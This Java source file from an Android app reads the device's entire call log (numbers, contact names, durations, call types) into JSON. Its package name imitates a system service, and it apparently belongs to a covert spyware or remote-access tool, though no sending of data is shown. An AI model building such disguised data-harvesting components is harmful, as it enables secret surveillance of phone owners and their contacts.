package com.android.background.services.helpers;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.provider.CallLog;

import com.android.background.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallsManager {

    public static JSONObject getCallsLogs() {
        try {
            JSONObject calls = new JSONObject();
            JSONArray callsList = new JSONArray();

            // Sort by date in descending order
            String sortOrder = CallLog.Calls.DATE + " DESC";

            // Query all call logs
            @SuppressLint("Recycle") Cursor cursor = MainService.getContextOfApplication().getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    sortOrder
            );

            if (cursor != null) {
                int phoneNumberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int contactNameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int callTypeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);

                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();

                    // Check if the column index is valid before retrieving data
                    if (phoneNumberIndex != -1) {
                        call.put("phoneNo", cursor.getString(phoneNumberIndex));
                    }

                    if (contactNameIndex != -1) {
                        call.put("name", cursor.getString(contactNameIndex));
                    }

                    if (durationIndex != -1) {
                        call.put("duration", cursor.getString(durationIndex));
                    }

                    if (callTypeIndex != -1) {
                        call.put("type", Integer.parseInt(cursor.getString(callTypeIndex)));
                    }

                    callsList.put(call);
                }

                // Add the call logs array to the main JSON object
                calls.put("callsList", callsList);

                // Close the cursor to avoid memory leaks
                cursor.close();

                return calls;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;
    }
}
